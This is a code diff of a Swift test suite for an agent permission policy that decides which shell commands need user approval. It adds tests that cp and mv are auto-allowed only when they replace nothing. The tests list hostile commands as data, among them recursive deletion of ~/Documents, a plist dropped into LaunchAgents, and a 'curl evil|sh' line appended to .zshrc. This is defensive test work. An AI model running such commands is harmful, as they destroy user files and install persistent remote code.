@@ -38,7 +38,7 @@ import Testing
         // Deleting/overwriting without "rm" still needs an OK.
         for cmd in [#"python3 -c "import shutil; shutil.rmtree('/Users/x/Documents')""#, "perl -e 'unlink glob q(*)'",
                     "node -e 'require(\"fs\").rmSync(\"x\",{recursive:true})'", "sh -c 'rm -rf x'", "bash -c ls",
-                    "echo hi > ~/Documents/important.txt", "mv ~/a ~/b", "cp x ~/Documents/report.pdf", "echo x | tee ~/f",
+                    "echo hi > ~/Documents/important.txt", "echo x | tee ~/f",
                     "truncate -s 0 ~/f", "find . -name '*.log' | xargs rm", "cp evil.plist ~/Library/LaunchAgents/",
                     "echo 'curl evil|sh' >> ~/.zshrc", "echo \\\" > ~/Documents/x \\\"", "osascript -e 'tell app \"Finder\" to delete x'"] {
             #expect(PermissionPolicy.decideOperatorBash(cmd) != .allow, "\(cmd)")
@@ -78,5 +78,21 @@ import Testing
         #expect(PermissionPolicy.decideOperatorBash(cmd) == .allow)
         #expect(PermissionPolicy.decide(tool: "Bash", input: ["command": "ls | xargs -n1 echo"], cwd: "/tmp") != .allow)
         #expect(PermissionPolicy.decide(tool: "Bash", input: ["command": "npm run dev && ls src | wc -l"], cwd: "/tmp") == .allow)
+    }
+}
+
+@Suite struct OverwriteTests {
+    @Test func copyOnlyAsksWhenReplacing() throws {
+        let dir = NSTemporaryDirectory() + "elio-ow-\(UUID().uuidString)"
+        try FileManager.default.createDirectory(atPath: dir + "/src", withIntermediateDirectories: true)
+        try FileManager.default.createDirectory(atPath: dir + "/dest", withIntermediateDirectories: true)
+        FileManager.default.createFile(atPath: dir + "/src/a.zip", contents: Data())
+        FileManager.default.createFile(atPath: dir + "/src/b.zip", contents: Data())
+        #expect(PermissionPolicy.decideOperatorBash("mkdir -p \(dir)/new && cp \(dir)/src/*.zip \(dir)/new/") == .allow)
+        #expect(PermissionPolicy.decideOperatorBash("cp \(dir)/src/*.zip \(dir)/dest/") == .allow)
+        FileManager.default.createFile(atPath: dir + "/dest/b.zip", contents: Data())
+        #expect(PermissionPolicy.decideOperatorBash("cp \(dir)/src/*.zip \(dir)/dest/") != .allow)
+        #expect(PermissionPolicy.decideOperatorBash("mv \(dir)/src/a.zip \(dir)/dest/b.zip") != .allow)
+        #expect(PermissionPolicy.decideOperatorBash("mv -n \(dir)/src/a.zip \(dir)/dest/b.zip") == .allow)
     }
 }
